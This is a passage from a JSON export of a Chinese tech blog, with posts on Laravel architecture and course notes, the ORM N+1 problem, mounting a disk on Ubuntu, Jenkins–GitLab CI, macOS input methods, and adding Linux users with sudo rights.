中大型项目架构","slug":"laravel-medium-and-large-project-architecture","date":"2021-03-30T15:59:36.000Z","updated":"2021-03-30T16:00:43.872Z","comments":true,"path":"laravel-medium-and-large-project-architecture/","link":"","permalink":"https://www.0x2beace.com/laravel-medium-and-large-project-architecture/","excerpt":"初学者学习 Laravel 时分两种，一种是乖乖的将程式填入 MVC 架构內，导致 controller 与 model 异常的肥大，日后一样很难维护；一种是常常不知道程式改写在哪一个 class 內而犹豫不決，毕竟传统 PHP 都是一个页面一个档案。本文整理出适合 Laravel 的中大型项目架构，兼具容易维护、容易扩充与容易重复使用的特点，并且容易测试。","text":"初学者学习 Laravel 时分两种，一种是乖乖的将程式填入 MVC 架构內，导致 controller 与 model 异常的肥大，日后一样很难维护；一种是常常不知道程式改写在哪一个 class 內而犹豫不決，毕竟传统 PHP 都是一个页面一个档案。本文整理出适合 Laravel 的中大型项目架构，兼具容易维护、容易扩充与容易重复使用的特点，并且容易测试。 一个项目只有 MVC 是不够的，我们需要更完整的项目架构。 Controller 过于臃肿受RoR的影响，初学者常认为 MVC 架构就是 model ,view,controller : Model 就是资料库。 Controller 负责与 HTTP 交互，调用 model 与 view。 View 就是 HTML。 假如依照这个定义，以下这些需求改写在哪里呢？ 发送 Email，使用外部 API。 使用 PHP 写的逻辑。 依需求将显示格式作转换。 依需求是否显示某些资料。 依需求显示不同资料。 其中 1, 2 属于商业逻辑，而 3, 4, 5 属于显示逻辑，若依照一般人对 MVC 的定义，model 是资料库，而 view 又是 HTML，以上这些需求都不能写在 model 与 view，只能勉强写在 controller。 因此初学者开始将大量程式写在 controller，造成 controller 的肥大难以维护。 Model 过于臃肿既然逻辑写在 controller 不方便维护，那我将逻辑都写在 model 就好了？ 当你将逻辑从 controller 搬到 model 后，虽然 controller 变瘦了，但却肥了 model，model 从原本代表资料库，現在变成还要负责商业逻辑与显示逻辑，结果更慘。 Model 代表资料库吗？把它想成是 Eloquent class就好，资料库逻辑应该写在 repository 里，这也是为什么 Laravel 5 已经沒有 models目录，Eloquent class 仅仅是放在 app 根目录下而已。 中大型项目架构那我们改怎么写呢？別将我们的思维局限在 MVC 內 : Model : 仅当成 Eloquent class。 Repository : 辅助 model，处理资料库逻辑，然后注入到 service。 Service : 辅助 controller，处理业务逻辑，然后注入到 controller。 Controller : 接收 HTTP request，调用其他 service。 Presenter : 处理显示逻辑，然后注入到 view。 View : 使用 blade 将资料 绑定 到 HTML。 上面架构我们可以发现 MVC 架构还在，由与 SOLID 的单一职责原則与依赖反转原则: 我们将资料库逻辑从 model 分离出来，由 repository 辅助 model，将 model 依赖注入进 repository。我们将商业逻辑从 controller 分离出来，由 service 辅助 controller，将 service 依赖注入进 controller。我們将显示逻辑从 view 分离出來，由 presenter 辅助 view，将 presenter 依赖注入进 view。 建立目录在 app 目录下建立 Repositories，Services 与 Presenters 目录。 別害怕建立目录！！ 別害怕在 Laravel 预设目录以外建立的其他目录，根据 SOLID 的单一职责原则，class 功能越多，责任也越多，因此越违反单一职责原则，所以你应该将你的程式分割成更小的部分，每个部分都有它专属的功能，而不是一个 class 功能包山包海，也就是所谓的万能类别，所以整个方案不应该只有 MVC 三个部分，放手根据你的需求建立适当的目录，并将适当的 class 放到该目录下，只要我们的 class 有 namespace 帮我们分类即可。 Repository由于篇幅的关系，将 repository 独立成专文讨论，请参考如何使用 Repository 模式? Service由于篇幅的关系，将 service 独立成专文讨论，请参考如何使用 Service 模式? Presenter由于篇幅的关系，将 presenter 独立成专文讨论，请参考如何使用 Presenter 模式? 单元测试由于现在 model、view、controller 的相依物件都已经拆开，也都使用依赖注入，因此每个部分都可以单独的做单元测试，如要测试 service，就将 repository 加以 mock，也可以将其他 service 加以 mock。 Presenter 也可以单独跑单元测试，将其他 service 加以 mock，不一定要跑验收测试才能测试显示逻辑。 Conclusion本文谈到的架构只是开始开始，你可以依照实际需求增加更多的目录与 class，当你发现你的 MVC 违反 SOLID 原则时，就大胆的将 class 从 MVC 拆开重构，然后依照以下手法 : 建立新的 class 或 interface。 将相依物件依赖注入到 class。 在 class 內处理他的职责。 将 class 或 interface 注入到 controller 或 view。 ————————————————版权声明：本文为CSDN博主「华尔街之猫」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/qq_24935119/article/details/89656569","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Linux 如何挂载新硬盘","slug":"how-to-mount-a-new-hard-disk-in-linux","date":"2021-03-25T14:40:48.000Z","updated":"2021-03-25T14:42:08.365Z","comments":true,"path":"how-to-mount-a-new-hard-disk-in-linux/","link":"","permalink":"https://www.0x2beace.com/how-to-mount-a-new-hard-disk-in-linux/","excerpt":"如何将一块新的硬盘挂载到Linux 操作系统呢？","text":"如何将一块新的硬盘挂载到Linux 操作系统呢？ 下面以Ubuntu 18.04的发行版作为演示。 首先查看系统当前硬盘分配情况： 1$ cd &#x2F;dev &amp;&amp; ls sd* -al 默认情况下，系统硬盘标记为/dev/sda，sda1、sda2这些表示对应硬盘下的分区名称。 查看当前系统硬盘挂载情况： 1$ df -h 可以到看，该系统当前一共挂载了两块硬盘，分别是： 分区名称为 /dev/sda2的系统盘 10G，挂载点为/。 分区名称为 /dev/sdb1的临时盘 2.5G，挂载点为/mydata。 现在来为该系统添加第三块硬盘，并尝试挂载到指定目录。 VirtualBox 添加磁盘添加硬盘之前，需要先将机器给停掉，右键设置，点击存储 创建虚拟盘： 按照默认选择VDI 就好： 根据自身情况，选择动态分配或者固定大小 这里选择分配三个G，然后点击创建。 将新硬盘加入进来，然后启动机器。 分区连接上机器之后，再次查看所有系统硬盘： 可以看到这次多了一个叫做sdc 的硬盘，首先需要对该硬盘进行分区，然后才能挂载。 这里我只需要新增一个主分区，执行以下命令： 1$ (echo n; echo p; echo 1; echo ; echo ; echo w) | sudo fdisk &#x2F;dev&#x2F;sdc 这条命令最终会做以下几件事情： echo n 新增分区 echo p 新建主分区 echo 1 新增一个主分区 echo 表示『回车』确定 echo 2 写入并退出 将以上输出作为输出通过管道符传递给fdisk命令 /dev/sdc 表示需要分区的硬盘 将文件系统写入分区： 1sudo mkfs -t ext4 &#x2F;dev&#x2F;sdc1 挂载硬盘将新硬盘挂载到指定目录： 1$ sudo mkdir &#x2F;boo &amp;&amp; sudo mount &#x2F;dev&#x2F;sdc1 &#x2F;boo 再次使用df -h命令查看磁盘情况，可以到看新硬盘已经挂载到指定目录下了。 最后记得设置开机挂载，使用blkid 命令获取硬盘UUID： 1$ sudo -i blkid 输出内容类似： 1&#x2F;dev&#x2F;sdc1: UUID&#x3D;&quot;f8025940-19bc-4943-9711-b431f478838e&quot; TYPE&#x3D;&quot;ext4&quot; PARTUUID&#x3D;&quot;d746a3a1-01&quot; 编辑/etc/fstab 文件，添加以下内容： 1UUID&#x3D;9da67a01-aaae-4979-93fd-9916f010731a &#x2F;boo ext4 defaults 0 0 至此就完成了硬盘挂载的所有操作了。 参考链接 虚拟机VirtualBox怎么添加新的虚拟硬盘 Azure: 给 ubuntu 虚机挂载数据盘","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Ubuntu","slug":"Linux/Ubuntu","permalink":"https://www.0x2beace.com/categories/Linux/Ubuntu/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"}]},{"title":"Mac 如何只保留一个输入法","slug":"how-to-keep-only-one-input-method-on-mac","date":"2021-03-20T01:27:00.000Z","updated":"2021-03-21T03:33:10.032Z","comments":true,"path":"how-to-keep-only-one-input-method-on-mac/","link":"","permalink":"https://www.0x2beace.com/how-to-keep-only-one-input-method-on-mac/","excerpt":"macOS 默认自带的是英文输入法，虽然也有简体中文，不过词库不丰富，不太好用。一般会选择安装一个第三方的输入法，这时就会有两个输入法共存了。","text":"macOS 默认自带的是英文输入法，虽然也有简体中文，不过词库不丰富，不太好用。一般会选择安装一个第三方的输入法，这时就会有两个输入法共存了。 常常会遇到的一个痛点就是多应用切换时，下一个输入法总是不确定，有时候是中文有时候是英文。 系统输入法切换的快捷方式是Control + Space，而落格输入法切换中英文又是Shift，这就导致总是需要来回切换，这一点就很烦。 这种情况下，如果只保留一个输入法，那就不会有这种困扰了。 但是系统并不允许我们删除默认的英文输入法，不过可以一些小手段来达到目的，具体步骤如下： 删除多余的输入法，只保留默认的英文输入法和正在使用的输入法 把当前输入法切换到默认的英文输入法 把~/Library/Preferences/路径下的com.apple.HIToolbox.plist文件拷贝到桌面，用Xcode 打开，找到并删除AppleEnabledInputSources中KeyboardLayout Name为US 那一项，然后保存。 用修改后的文件替换~/Library/Preferences/路径下文件 重启电脑即可 参考链接 删除macOS自带的英文输入法","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"},{"name":"Skill","slug":"Mac/Skill","permalink":"https://www.0x2beace.com/categories/Mac/Skill/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Jenkins + Gitlab 持续集成","slug":"jenkins-gitlab-continuous-integration","date":"2021-03-16T14:27:42.000Z","updated":"2021-03-17T14:56:26.907Z","comments":true,"path":"jenkins-gitlab-continuous-integration/","link":"","permalink":"https://www.0x2beace.com/jenkins-gitlab-continuous-integration/","excerpt":"Jenkins 是什么？ Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具。","text":"Jenkins 是什么？ Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具。 Jenkins 如何与Gitlab 进行关联？ 可以通过生成密钥（Webhooks 的钩子），然后到Gitlab 需要集成的项目中，设置集成功能，增加Web 钩子。 这样当进行Push 动作时，就会触发Jenkins 进行构建，然后执行相应的流水线。 对于小公司而言，开发服务器常用的架构是内网服务器（本地机器）+外网服务器内网穿透，Jenkins + 私有Gitlab 持续集成。 背景：Jenkins 和Gitlab 部署在外网服务器上，通过内网穿透对内网服务器（开发服务器）进行访问。需求描述：每次进行Push 时，触发Jenkins 流水线，进行构建，将最新的版本同步到开发服务器上。 Jenkins的功能很强大，这里并不打算深入拓展，而是介绍一种相较简单粗暴的方式去完成持续集成。 创建任务首先需要在Jenkins 上新建任务，因为需求并不复杂，这里直接选择流水线的方式 如果需要关联TAPD，这里需要「关联TAPD」填上对应TAPD 的ID。 核心的配置在构建触发器这一块，根据Push 事件，触发执行流水线。 有以下几个点需要注意： 因为是开发服务器，并没有开启合并请求。 Gitlab webhook URL 需要记住，后面会用到。 默认允许所有分支，如果有特殊需求，可以指定分支名进行过滤。 点击右下角的Generate 按钮生成Secret token，后面会用到。 配置流水线： 上半部分是连接内网服务器（开发服务器）的基础信息，下半的配置信息是需要执行的构建脚本。 构建脚本的作用其实就是去执行git pull 这个动作，大概长这样： 1234567#!&#x2F;usr&#x2F;bin&#x2F;bashpull() &#123; cd &#x2F;var&#x2F;www&#x2F;project &amp;&amp; git pull&#125;pull 流水线配置，点击查看详情信息 def bdService() { def remote = [:] remote.name = 'hostname' remote.host = 'localhost' remote.port = 22 remote.user = 'username' remote.password = 'password' remote.allowAnyHosts = true return remote } pipeline { agent any stages { stage('代码集成') { steps { script { def remote = bdService(); sshCommand remote: remote, command: \"/bin/bash /opt/shell/build.sh\" } } } } } 配置完成之后，点击保存。 返回工作态，找到对应任务，点击立即构建。 通过构建历史，查看Console Output，能看到类似输出则表示构建成功。 构建成功之后，就可以与Gitlab 进行关联了，点击项目=&gt;设置=&gt;集成。 链接（URL）是之前的 Webhook url，安全令牌则是上面生成的 Secret token，SSL 证书验证视情况选择是否开启，然后点击增加Web 钩子。 至此所有的配置就基本完成了，这时可以去测试Push，看看是否会执行自动构建。","categories":[{"name":"运维","slug":"运维","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/"},{"name":"Jenkins","slug":"运维/Jenkins","permalink":"https://www.0x2beace.com/categories/%E8%BF%90%E7%BB%B4/Jenkins/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"CI","slug":"CI","permalink":"https://www.0x2beace.com/tags/CI/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.0x2beace.com/tags/Jenkins/"},{"name":"CD","slug":"CD","permalink":"https://www.0x2beace.com/tags/CD/"}]},{"title":"什么是 N+1 问题，以及如何解决","slug":"what-is-the-n-1-problem-and-how-to-solve-it","date":"2021-03-15T14:10:11.000Z","updated":"2021-03-17T04:42:49.315Z","comments":true,"path":"what-is-the-n-1-problem-and-how-to-solve-it/","link":"","permalink":"https://www.0x2beace.com/what-is-the-n-1-problem-and-how-to-solve-it/","excerpt":"N+1 是ORM（对象关系映射）关联数据读取中存在的一个问题。","text":"N+1 是ORM（对象关系映射）关联数据读取中存在的一个问题。 在介绍什么是N+1问题之前，首先思考一个问题： 假设现在有一个用户表（User）和一个余额表（Balance），这两个表通过user_id进行关联。现在有一个需求是查询年龄大于18岁的用户，以及用户各自的余额。 这个问题并不难，但对于新手而言，可能常常会犯的一个错误就是在循环中进行查询。 12345$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18)-&gt;select();foreach($users as $user)&#123; $balance &#x3D; User::getFieldByUserId($user-&gt;user_id, &quot;balance&quot;); $user[&#39;balance&#39;] &#x3D; $balance;&#125; 这样做是非常糟糕的，数据量小还少，在数据量较大的情况下，是非常消耗数据库性能的。 通过Mysql 查询日志，可以看到查询用户表是一次，因为有四个符合该条件的用户，查询用户表关联的余额表是四次。 N+1问题就是这样产生的：查询主表是一次，查询出N 条记录，根据这N 条记录，查询关联的副（从）表，共需要N 次。所以，应该叫1+N 问题更合适一些。 其实，如果稍微了解一点SQL，根本不用这么麻烦，直接使用JOIN 一次就搞定了。 对于这类问题，ORM 其实为我们提供了相应的方案，那就是使用『预加载功能』。 预加载功能使用with()方法指定想要预加载的关联： 123$users &#x3D; User::where(&quot;age&quot;, &quot;&gt;&quot;, 18) -&gt;with(&quot;hasBalance&quot;) -&gt;select(); hasBalance 是什么呢？ 它是在User模型中定义的一个方法： 12345678910class User extends Model&#123; &#x2F;&#x2F; ... &#x2F;&#x2F; User模型与Balance 模型进行一对一关联 public function hasBalance() &#123; return $this-&gt;hasOne(Balance::class, &quot;user_id&quot;, &quot;user_id&quot;); &#125;&#125; 通过这个方法让User 模型与Balance 模型进行一对一关联。 现在再来看一下Mysql 的查询日志： 可以很清楚的看到，总查询次数由原来的1+N 变成了现在的1+1。 总结N+1 问题是什么？会造成什么影响？应该如何解决？ 执行一次查询获取N 条主数据后，由于关联引起的执行N 次查询从数据 带来了不必要的查询开销 可以通过框架 ORM 自带的with 去解决","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"https://www.0x2beace.com/tags/ThinkPHP/"}]},{"title":"L01 Laravel 教程- Web 开发实战入门课程笔记","slug":"laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development","date":"2021-03-14T04:10:01.000Z","updated":"2021-03-15T14:18:15.623Z","comments":true,"path":"laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/","link":"","permalink":"https://www.0x2beace.com/laravel-tutorial-notes-for-a-hands-on-introduction-to-web-development/","excerpt":"L01 Laravel 教程- Web 开发实战入门课程笔记。","text":"L01 Laravel 教程- Web 开发实战入门课程笔记。 第一章构建应用（8.*）： 1$ composer create-project laravel&#x2F;laravel weibo --prefer-dist &quot;8.*&quot; 构建应用（5.*）： 1$ composer create-project laravel&#x2F;laravel Laravel --prefer-dist &quot;5.7.*&quot; Ubuntu 中查看所有PHP 版本： 1$ update-alternatives --display php Ubuntu 中快速切换PHP 版本： 1$ sudo update-alternatives --config php 工作原理： 注意事项： 路由的服务提供者类中设置命名空间 blade.php 是Laravel 的一套模版引擎，有自己的一套规则，通过继承父视图，可以减少很多重复代码 art tinker 是 Laravel 框架自带的命令，用以调出 Laravel 的交互式运行时 artisan 命令Artisan 是 Laravel 提供的 CLI（命令行接口）。 常用命令如下：|命令|说明||-|-||php artisan key:generate|生成App Key||php artisan make:controller|生成控制器||php artisan make:model|生成模型||php artisan make:policy|生成授权策略||php artisan make:seeder|生成Seeder 文件||php artisan migrate|执行迁移||php artisan migrate:rollback|回滚迁移||php artisan migrate:refresh|重置数据库||php artisan db:seed|填充数据库||php artisan migrate:refresh –seed|进行数据库迁移同时填充数据库||php artisan tinker|进入tinker 环境||php artisan route:list|查看路由列表| 第一章学到了什么 如何构建一个Laravel 应用 对新建的Laravel 项目进行基本配置 手动创建控制器、静态视图 了解路由、控制器、视图的基本协作方式 了解如何使用通用视图 了解Artisan 命令的基本使用 第二章1$ composer require laravel&#x2F;ui:^3.0 --dev composer require 命令是用来安装扩展包的命令，参数--dev表示仅仅只在开发环境中使用。 上面命令安装完成之后，使用以下命令来引入 bootstrap： 1$ php artisan ui bootstrap 建议使用yarn命令代替npm 命令： 1$ yarn install 前端代码编译出现问题时，可以尝试将node_moudles文件夹删除，再次安装相关依赖。 1$ npm run watch-poll 上面这条命令的作用其实就是监视前端文件变化，如果有变化的话，就马上编译。 生成环境中，为什么不用一直开启这个命令？ 这是因为服务端只需要手动编译一次就好，也就是使用npm run dev命令。 之所以说Laravel 是全栈框架，就是因为它在一个项目中把前端和后端所有东西都包揽了。 Laravel 的前端工作流Laravel 的前端工作流是通过 Sass、NPM、Yarn、Laravel Mix 构成一套前端工作流。 Sass 是一种可用于编写CSS 的语言。 Yarn 是一个用于代替NPM 客户端的新的包管理器。 Laravel Mix 是一个前端任务自动化管理工具。Laravel Mix 可以自动编译resources下面的文件。 双括号 是在Html 中内嵌PHP 的Blade 语法，表示包含在该区域内的代码使用PHP 来编译执行。 第二章学到了什么 Laravel 的前端工作流 局部视图的订单和引用 命名路由的定义和使用 第三章Eloquent ORM其特点是一个模型对应数据库中的一个表。 在进行数据库迁移时，up 方法会被调用，在进行数据库回滚时，down方法会被调用。 所以无论是初次创建表，还是后面增加字段，都需要去up 方法下进行定义，这样在数据库迁移时才会生效。 创建一张表： 1$ php artisan make:migration create_followers_table --create&#x3D;&quot;followers&quot; 增加一个字段： 1$ php artisan make:migration add_activation_to_users_table --table&#x3D;users 数据库的回滚与迁移直接对应着 databases 文件夹下的迁移文件。 创建模型的同时并进行迁移： 1$ php artisan make:model Model&#x2F;Articles -m 可以使用以下命令进行数据库交互： 1$ php artisan tinker 该命令可以进入Eloquent 模型，直接进行数据库交互。在该模式下，Eloquent 模型的方法均可以使用。 第三章学到了什么？ Eloquent 模型的定义与应用 数据库迁移与回滚（数据表生成与删除） 模型的创建与使用 tinker 的使用 第四章在本地可以这样访问Homestead 的数据库： 1$ mysql -uhomestead -h127.0.0.1 -P33060 -p &#x2F;&#x2F; 或者 mysql -uhomestead -h192.168.10.10 -P3306 -p 但是在项目（Homestead）中，只能这样访问： 1$ mysql -uhomestead -h127.0.0.1 -P3360 -p &#x2F;&#x2F; 或者 mysql -uhomestead -h192.168.10.10 -P3306 -p 因为端口做了映射（Homestead 3306=&gt; 主机 33060），而项目又运行在Homestead 中，所以项目配置中的端口不能写成33060，否则无法正常访问。 隐形路由绑定这个『隐形路由绑定』倒底是个啥玩意？简单理解就是通过控制器把模型绑定在路由中了。 路由代码： 1Route::get(&#39;&#x2F;users&#x2F;&#123;user&#125;&#39;, &#39;UsersController@show&#39;)-&gt;name(&#39;users.show&#39;); 控制器及模型代码： 12345use App\\Models\\User;public function show (User $user)&#123; return view(&quot;users.show&quot;, compact(&quot;user&quot;)); &#125; 上面这段代码有很多知识点： 控制器方法show 是通过路由获取的 User $user 是定义在控制器中的方法的Eloquent 模型类型声明 由于show 方法传参时声明了类型——Eloquent 模型，对应的变量名$user 会匹配路由片段中的{user}，这样Laravel 会自动注入与请求URL 传入的ID 对应的用户模型实例。 这里利用了隐形路由绑定，直接读取对应ID 的用户的实例。 其实这个和ThinkPHP 中的路由传参很像，只不过不同的是ThinkPHP 中没有定义模型。 12345Route::get(&#39;hello&#x2F;:name&#39;, &#39;index&#x2F;hello&#39;);public function hello($name)&#123; return $name; &#125; Laravel 是如何接收前端的参数的？ 123public function sotre(Request $request)&#123; &#x2F;&#x2F; 通过使用Illuminate\\Http\\Request 实例来接收用户输入&#125; 第四章学到了什么 使用RESTFUL 来构建路由资源 通过表单与控制器协同处理数据 验证表单提交的数据，并返回相应的内容 利用Composer 安装相应扩展包 使用闪存来展示用户信息 第五章Laravel 提供了attempt 方法用于登录验证。 123if (Auth::attempt([&#39;email&#39; &#x3D;&gt; $email, &#39;password&#39; &#x3D;&gt; $password])) &#123; &#x2F;&#x2F; 该用户存在于数据库，且邮箱和密码相符合&#125; attempt 方法接收一个数组作为第一个参数，会去数据库中找寻对应的值，逻辑如下： 找寻email字段匹配的值 如果没找到，直接返回false 如果能找到：i. 先将传参password进行加密，与数据库中的值进行比对ii. 如果两个值匹配，会创建一个会话给验证通过的用户，在会话创建的同时，也会种下一个名为 laravel_session 的 HTTP Cookie，以此 Cookie 来记录用户登录状态，最终返回 trueiii. 如果不匹配，返回false 登录成功之后，可以使用Auth::user() 获取用户信息。 1Route::get(&#39;login&#39;, &#39;SessionsController@create&#39;)-&gt;name(&#39;login&#39;); 通过name() 方法定义路由名称，这样需要访问该路由时，直接访问该名称就好。 第五章学到了什么 Auth 认证的使用 了解Laravel 常用登录机制的具体实现 集成Bootstrap Javascript 组件 通过 “记住我” 来记住用户登录状态 第六章通常开发编辑用户时，需要先从数据库中获取到该用户当前的信息，然后再进行编辑。 在Laravel 中，只需要几行代码就可以完成这件事情。 123public function edit(User $user)&#123; return view(&quot;users.edit&quot;, compact(&quot;user&quot;))&#125; 这里通过『隐形路由绑定』，把对应ID 的用户的实例作为控制器参数。 中间件访问限制有时我们会希望未登录的用户，不能访问某些功能，这时可以通过 Auth 提供的中间很方便的完成。 1234$this-&gt;middleware(&quot;auth&quot;, [ &#x2F;&#x2F; 指定这几个方法不使用Auth 去验证 &quot;except&quot; &#x3D;&gt; [&quot;show&quot;, &quot;create&quot;, &quot;store&quot;, &quot;index&quot;, &quot;confirmEmail&quot;]]); 授权验证但需要注意的时，这里仅仅限制的是未登录，而有些功能则是需要在登录状态下进行限制，比如：ID 为1 的用户不能修改ID 为2 的用户的信息。 这个就不是中间件职责范围内能做的事情了，这个需要授权策略来完成。 12345&#x2F;&#x2F; 定义策略public function update(User $currentUser, User $user)&#123; return $currentUser-&gt;id &#x3D;&#x3D;&#x3D; $user-&gt;id;&#125; 还需要在控制器中验证才算正真使用了。 123456&#x2F;&#x2F; 使用策略public function update(User $user)&#123; $this-&gt;authorize(&quot;update&quot;, $user); &#x2F;&#x2F; ... &#125; 数据填充数据填充需要使用Seeder 类，如果需要进行数据填充，需要调用 Seeder 的call 方法。 以用户模型为例，填充步骤如下： 首先创建用户工厂，定义填充数据 1$ php artisan make:factory UserFactroy 创建用户生成器，实现run 方法 1$ php artisan make:seeder UsersTableSeeder 在DatabaseSeeder 类中实现run 方法，调用 call 方法 123456789public function run()&#123; &#x2F;&#x2F; \\App\\Models\\User::factory(10)-&gt;create(); Model::unguard(); $this-&gt;call(UsersTableSeeder::class); Model::reguard();&#125; 重置数据库 1$ php artisan migrate:refresh 填充数据 1php artisan db:seed 第六章学到了什么 通过路由传参与控制器进行交互（隐形路由绑定 使用Patch 动作更新用户信息，Delete 动作删除用户 使用Auth 中间件过滤用户请求、guest 中间件 使用权限策略，对一些必要的动作进行权限验证 使用数据填充来生成假数据 重置数据库以及迁移数据库并生成新数据 通过数据库迁移来进行数据库字段的更新 第七章什么时候应该在控制器中增加User $user 这样的代码呢？ 看路由，看路由，看路由，看路由是如何定义的。 如果路由中有这样的东西，那么一定要是要的。 1Route::get(&quot;&#x2F;users&#x2F;&#123;user&#125;&quot;, &quot;UserController@show&quot;)-&gt;name(&quot;users.show&quot;); 这是为什么呢？因为隐形路由绑定。 这里还有一个细节就是如何判断一个路由或者一个控制器是否是隐形路由绑定？除了只是看路由之外，还需要看是否有与之对应的模型。这一点很重要哦。 另外什么时候需要Request $request 呢？也是看路由，Post 方法一定需要的。 12345678910111213&#x2F;&#x2F; 定义路由Route::get(&quot;password&#x2F;&#123;token&#125;&quot;, &quot;PasswordController@showResetForm&quot;)-&gt;name(&quot;password.reset&quot;);&#x2F;&#x2F; 方式一public function showResetForm($token)&#123; var_dump($token);&#125;&#x2F;&#x2F; 方式二public function showResetForm(Request $request)&#123; $token &#x3D; $request-&gt;route()-&gt;parameter(&#39;token&#39;); var_dump($token);&#125; Laravel 中的几种操作数据库的方式： 1234567891011121314151617181920public function store(User $user)&#123; &#x2F;&#x2F; 方式一 $user-&gt;name &#x3D; &quot;boo&quot;; $user-&gt;save(); &#x2F;&#x2F; 方式二 $user-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]); &#x2F;&#x2F; 方式三 User::where(&quot;id&quot;, $user-&gt;id)-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]); &#x2F;&#x2F; 方式四 DB::table(&quot;users&quot;)-&gt;where(&quot;id&quot;, $user-&gt;id)-&gt;update([ &quot;name&quot; &#x3D;&gt; &quot;boo&quot;, ]);&#125; 第七章学到了什么 使用迁移为数据库表增加字段 在模型中，定义监听器，监听操作 使用Laravel 发送邮件功能 在本地（log）调试发送邮件功能 通过邮件发送注册链接来激活用户 通过邮件来找回密码 第八章 Laravel 中模型与模型之间是如何进行关联的呢？ 答案是通过主键与外键进行关联。 通过Eloquent 关联模型与模型之间的关系： 一对一 一对多 多对一 多对多 Auth::user() 方法可以获取到当前用户的实例。 在User模型中定义了一个方法，然后通过Auth::user()获取到的实例进行调用。 如果没有一对多的关系，需要这样创建一条微博： 1App\\Models\\Status::create() 如果将用户模型与微博模型进行关联之后，可以得到以下方法： 1$user-&gt;statuses()-&gt;create() 其中statuses() 是在用户模型中定义好的（名称可以不一样)： 12345public function statuses()&#123; &#x2F;&#x2F; user表正向关联 status表 return $this-&gt;hasMany(Status::class, &quot;user_id&quot;, &quot;id&quot;);&#125; 第八章学到了什么 两个模型之间如何进行关联 通过模型关联获取数据 对微博发布时间进行友好处理，并中文化 建立工厂、以及生成器、并生成假数据 通过数据关联来创建微博 通过数据关联来删除微博 修复批量赋值的错误 第九章正式写SQL 之前，可以先使用tinker 通过模型操作数据。 通过在模型中定义一些方法，以便可以在其他地方直接获取到数据。 第九章学到了什么 多对多关系应用 新增和销毁多对多关联 使用 with 来避免N+1 问题","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Linux 添加用户及提权","slug":"linux-to-add-users-and-rights","date":"2021-03-12T14:04:50.000Z","updated":"2021-03-13T04:18:51.999Z","comments":true,"path":"linux-to-add-users-and-rights/","link":"","permalink":"https://www.0x2beace.com/linux-to-add-users-and-rights/","excerpt":"刚拿到一台服务器时，通常会禁用root 用户登录，而使用其他普通用户，这时就需要创建一个新用户。","text":"刚拿到一台服务器时，通常会禁用root 用户登录，而使用其他普通用户，这时就需要创建一个新用户。 添加用户创建一个新用户： 1$ useradd boo 设置密码： 1$ passwd boo 提权此时此用户已经可以正常使用了，但是还没有提权，所以很多事情做不了，这时可以把该用户加入sudo 用户组，通过sudo命令来进行提权。 1$ usermod -G sudo boo 一般直接就加入成功了，但是有些发行版本默认并没有sudo用户组，所以这时需要先添加用户组。 1$ groupadd sudo 手动添加完用户组之后，还需要修改sudoers配置文件，这里有几种方式，根据实际情况进行选择： 允许sudo 组的成员执行任何命令 12345$ sudo visudo &#x2F;&#x2F; 或者 sudo vim &#x2F;etc&#x2F;sudoers&#x2F;&#x2F; 添加以下内容# the &#39;sudo&#39; group has all the sudo privileges%sudo ALL&#x3D;(ALL:ALL) ALL 直接允许该用户执行任何命令12345$ sudo visudo &#x2F;&#x2F; 添加以下内容，注意：没有% # Allow boo to run any commands anywhereboo ALL&#x3D;(ALL:ALL) ALL 通常还是建议将用户添加至sudo 用户组，然后赋予sudo 组成员权限，而不是直接对具体某个用户进行提权。 总结查看所有用户的列表： 1$ cat &#x2F;etc&#x2F;passwd 查看所有用户组： 1$ cat &#x2F;etc&#x2F;group 查看当前登入用户的组： 1$ groups 查看指定用户所在的组： 1$ groups usernmae 添加用户： 1$ useradd username 设置(重置)密码： 1$ passwd username 添加用户组： 1$ groupadd group_name 将某个用户添加到某个组： 1$ usermod -G group_name username 编辑sudoers 配置文件： 1$ sudo visudo","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"如何在 PHP 